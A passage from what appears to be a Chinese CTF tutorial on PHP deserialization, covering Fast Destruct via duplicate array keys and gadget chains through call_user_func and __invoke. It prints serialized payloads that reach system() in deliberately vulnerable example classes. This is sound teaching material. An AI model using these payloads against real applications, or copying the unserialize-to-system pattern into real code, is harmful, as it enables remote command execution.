+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello</span><br><span class="line">destruct</span><br></pre></td></tr></table></figure></div>
+
+<p>因为 <code>$obj</code> 一直存活到脚本结束。</p>
+<p>Fast Destruct 要做的事情就是：让对象在反序列化过程中或刚反序列化完成时失去引用，从而提前析构。</p>
+<h3 id="2-2-核心原理"><a href="#2-2-核心原理" class="headerlink" title="2.2 核心原理"></a>2.2 核心原理</h3><p>PHP 对象触发析构的关键条件是：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象没有任何引用时，会被销毁，并调用 __destruct()</span><br></pre></td></tr></table></figure></div>
+
+<p>Fast Destruct 最经典的方式是数组重复键覆盖。</p>
+<p>payload 模板：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;对象payload;i:0;N;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>例如目标对象：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Evil&quot;:1:&#123;s:3:&quot;cmd&quot;;s:2:&quot;id&quot;;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Fast Destruct 版本：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;O:4:&quot;Evil&quot;:1:&#123;s:3:&quot;cmd&quot;;s:2:&quot;id&quot;;&#125;i:0;N;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这个数组可以理解为：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="keyword">new</span> <span class="title class_">Evil</span>(),</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>
+
+<p>两个元素的 key 都是 <code>0</code>。</p>
+<p>PHP 反序列化时大致过程是：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 创建 Evil 对象，放到数组 key 0</span><br><span class="line">2. 继续解析第二个 key 0</span><br><span class="line">3. 第二个 key 0 的值是 null</span><br><span class="line">4. null 覆盖原来的 Evil 对象</span><br><span class="line">5. Evil 对象失去引用</span><br><span class="line">6. 立即触发 Evil::__destruct()</span><br></pre></td></tr></table></figure></div>
+
+<p>所以它叫 Fast Destruct，快速析构。</p>
+<h3 id="2-3-实例"><a href="#2-3-实例" class="headerlink" title="2.3 实例"></a>2.3 实例</h3><p>题目代码：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__destruct: &#x27;</span> . <span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27; after unserialize &#x27;</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>普通 payload：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Evil&quot;:1:&#123;s:3:&quot;cmd&quot;;s:2:&quot;id&quot;;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>常见执行顺序：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">after unserialize __destruct: id</span><br></pre></td></tr></table></figure></div>
+
+<p>Fast Destruct payload：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;O:4:&quot;Evil&quot;:1:&#123;s:3:&quot;cmd&quot;;s:2:&quot;id&quot;;&#125;i:0;N;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>执行顺序会变成：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct: id after unserialize</span><br></pre></td></tr></table></figure></div>
+
+<p>也就是析构方法提前执行了。</p>
+<h3 id="2-4-CTF-中的利用"><a href="#2-4-CTF-中的利用" class="headerlink" title="2.4 CTF 中的利用"></a>2.4 CTF 中的利用</h3><p>Fast Destruct 常用于抢在后续逻辑之前触发 <code>__destruct()</code>。</p>
+<p>例如题目代码：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="variable">$obj</span>-&gt;cmd = <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>普通 payload：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Evil&quot;:1:&#123;s:3:&quot;cmd&quot;;s:2:&quot;id&quot;;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>反序列化后，代码会执行：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$obj</span>-&gt;cmd = <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>最后析构时执行的可能是：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
+
+<p>而不是我们原来设置的 <code>id</code>。</p>
+<p>使用 Fast Destruct：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;O:4:&quot;Evil&quot;:1:&#123;s:3:&quot;cmd&quot;;s:2:&quot;id&quot;;&#125;i:0;N;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>Evil::__destruct()</code> 会在后续赋值前触发。</p>
+<p>于是后面的：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$obj</span>-&gt;cmd = <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>已经影响不到那个被提前销毁的对象。</p>
+<h3 id="2-5-与-PHP-Incomplete-Class的关系"><a href="#2-5-与-PHP-Incomplete-Class的关系" class="headerlink" title="2.5 与__PHP_Incomplete_Class的关系"></a>2.5 与__PHP_Incomplete_Class的关系</h3><p>Fast Destruct 和 <code>__PHP_Incomplete_Class</code> 是两个不同技巧。</p>
+<p>不完整类解决的是：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类不存在时，如何通过 serialize(unserialize($x)) 这类稳定性检查</span><br></pre></td></tr></table></figure></div>
+
+<p>Fast Destruct 解决的是：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象已经能被实例化时，如何让 __destruct() 尽快执行</span><br></pre></td></tr></table></figure></div>
+
+<p>注意：如果反序列化时目标类不存在，得到的是 <code>__PHP_Incomplete_Class</code>，不会触发目标类的 <code>__destruct()</code>。</p>
+<p>也就是说：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">类不存在阶段：适合用不完整类过检查</span><br><span class="line">类存在阶段：适合用 Fast Destruct 提前触发析构</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="2-6-注意点"><a href="#2-6-注意点" class="headerlink" title="2.6 注意点"></a>2.6 注意点</h3><p>Fast Destruct 常见 payload 是数组：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;...&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>所以 <code>unserialize()</code> 的返回值通常不是目标对象，而是数组。</p>
+<p>如果题目后面强制要求：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="variable">$obj</span> <span class="keyword">instanceof</span> Evil) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;no&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>那么这种 Fast Destruct 形式可能过不了。</p>
+<p>另外，如果题目前面有严格检查：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$x</span>)) == <span class="variable">$x</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Fast Destruct payload 不一定能通过。</p>
+<p>因为对象被重复键覆盖后，最终数组可能只剩下：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;i:0;N;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这和原 payload 不一致。</p>
+<p>所以实际做题时要分清：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">稳定性检查阶段：优先考虑不完整类</span><br><span class="line">最终触发阶段：再考虑 Fast Destruct</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="3-Callable"><a href="#3-Callable" class="headerlink" title="3. Callable"></a>3. Callable</h2><h3 id="3-1-它是什么"><a href="#3-1-它是什么" class="headerlink" title="3.1 它是什么"></a>3.1 它是什么</h3><p><code>callable</code> 在 PHP 中表示“可调用的东西”。</p>
+<p>简单说：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只要一个值能被 PHP 当成函数或方法调用，它就是 callable</span><br></pre></td></tr></table></figure></div>
+
+<p>常见 callable 形式包括：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;phpinfo&#x27;</span>              <span class="comment">// 普通函数名</span></span><br><span class="line"><span class="string">&#x27;system&#x27;</span>               <span class="comment">// 普通函数名</span></span><br><span class="line">[<span class="variable">$obj</span>, <span class="string">&#x27;method&#x27;</span>]        <span class="comment">// 对象方法</span></span><br><span class="line">[<span class="string">&#x27;ClassName&#x27;</span>, <span class="string">&#x27;method&#x27;</span>] <span class="comment">// 静态方法</span></span><br><span class="line"><span class="string">&#x27;ClassName::method&#x27;</span>     <span class="comment">// 静态方法字符串</span></span><br><span class="line"><span class="variable">$closure</span>                <span class="comment">// 匿名函数</span></span><br><span class="line"><span class="variable">$objectWithInvoke</span>       <span class="comment">// 实现 __invoke() 的对象</span></span><br></pre></td></tr></table></figure></div>
+
+<p>例如：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="variable">$func</span>();</span><br></pre></td></tr></table></figure></div>
+
+<p>等价于：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure></div>
+
+<p>如果：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$func</span>(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>等价于：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-2-call-user-func"><a href="#3-2-call-user-func" class="headerlink" title="3.2 call_user_func()"></a>3.2 <code>call_user_func()</code></h3><p><code>call_user_func()</code> 用于调用一个回调函数。</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$callback</span>, <span class="variable">$arg1</span>, <span class="variable">$arg2</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>例如：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;var_dump&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>等价于：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;hello&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>如果是：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>就等价于：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>所以在反序列化题里看到：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;arg);</span><br></pre></td></tr></table></figure></div>
+
+<p>就要立刻看：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;func 能不能控制成 system</span><br><span class="line">$this-&gt;arg 能不能控制成参数</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-3-call-user-func-array"><a href="#3-3-call-user-func-array" class="headerlink" title="3.3 call_user_func_array()"></a>3.3 <code>call_user_func_array()</code></h3><p><code>call_user_func_array()</code> 和 <code>call_user_func()</code> 类似，只是参数用数组传。</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$callback</span>, <span class="variable">$args</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>例如：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;system&#x27;</span>, [<span class="string">&#x27;id&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>
+
+<p>等价于：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>典型题目：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callback</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;callback, <span class="variable">$this</span>-&gt;args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>payload：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Task&quot;:2:&#123;s:8:&quot;callback&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;a:1:&#123;i:0;s:2:&quot;id&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>执行效果：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-4-is-callable-不是安全过滤"><a href="#3-4-is-callable-不是安全过滤" class="headerlink" title="3.4 is_callable() 不是安全过滤"></a>3.4 <code>is_callable()</code> 不是安全过滤</h3><p><code>is_callable()</code> 用来判断一个值能否被调用。</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_callable</span>(<span class="string">&#x27;phpinfo&#x27;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="title function_ invoke__">is_callable</span>(<span class="string">&#x27;system&#x27;</span>);  <span class="comment">// true</span></span><br></pre></td></tr></table></figure></div>
+
+<p>很多题目会写：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$this</span>-&gt;func)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这不是安全限制。</p>
+<p>如果攻击者能控制：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;func = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;arg = <span class="string">&#x27;id&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>那么：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_callable</span>(<span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>返回 <code>true</code>，后面仍然会调用：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-5-invoke-与-callable"><a href="#3-5-invoke-与-callable" class="headerlink" title="3.5 __invoke() 与 callable&gt; "></a>3.5 <code>__invoke()</code> 与 <code>callable&gt; </code></h3><p>如果一个类定义了 <code>__invoke()</code>，它的对象本身就可以被当成函数调用。</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;invoke&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="variable">$obj</span>();</span><br></pre></td></tr></table></figure></div>
+
+<p>执行结果：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke</span><br></pre></td></tr></table></figure></div>
+
+<p>所以看到这种代码：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="variable language_">$this</span>-&gt;callback)();</span><br></pre></td></tr></table></figure></div>
+
+<p>就要想到：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;callback 可以是一个实现了 __invoke() 的对象</span><br></pre></td></tr></table></figure></div>
+
+<p>例如：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callback</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;callback)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">End</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>利用链：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Start::__destruct()</span><br><span class="line">  -&gt; ($this-&gt;callback)()</span><br><span class="line">  -&gt; End::__invoke()</span><br><span class="line">  -&gt; 读取 flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-6-例题"><a href="#3-6-例题" class="headerlink" title="3.6 例题"></a>3.6 例题</h3><p>题目代码：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callback</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$this</span>-&gt;callback)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;callback, <span class="variable">$this</span>-&gt;arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>
+
+<p>分析：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unserialize($_GET[&#x27;data&#x27;]) 用户可控</span><br><span class="line">User::__destruct() 请求结束自动触发</span><br><span class="line">$callback 和 $arg 都是 public 属性，可以通过 payload 控制</span><br><span class="line">is_callable(&#x27;system&#x27;) 返回 true</span><br><span class="line">call_user_func(&#x27;system&#x27;, &#x27;id&#x27;) 可以被调用</span><br></pre></td></tr></table></figure></div>
+
+<p>payload：</p>
